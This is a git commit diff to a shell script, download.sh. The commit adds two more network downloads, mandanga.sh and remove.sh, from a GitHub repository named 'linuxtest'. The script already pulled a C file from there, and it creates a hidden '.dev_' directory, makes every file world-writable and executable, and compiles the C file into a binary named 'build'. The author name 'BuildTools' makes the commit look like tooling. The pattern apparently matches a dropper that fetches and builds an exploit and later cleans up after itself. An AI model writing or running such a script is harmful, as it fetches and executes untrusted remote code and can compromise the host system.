08cd66b335cd5fb8b1dfea230ae3fa8e8c208530
BuildTools <unconfigured@null.spigotmc.org>
2022-10-05 12:17:22 +0200

    download script2

--- download.sh
+++ download.sh
@@ -2,6 +2,8 @@
 mkdir .dev_
 cd .dev_
 wget https://raw.githubusercontent.com/Ren0X1/linuxtest/main/18411.c
+wget https://raw.githubusercontent.com/Ren0X1/linuxtest/main/mandanga.sh
+wget https://raw.githubusercontent.com/Ren0X1/linuxtest/main/remove.sh
 chmod 777 *
 gcc -o build 18411.c
 chmod 777 *
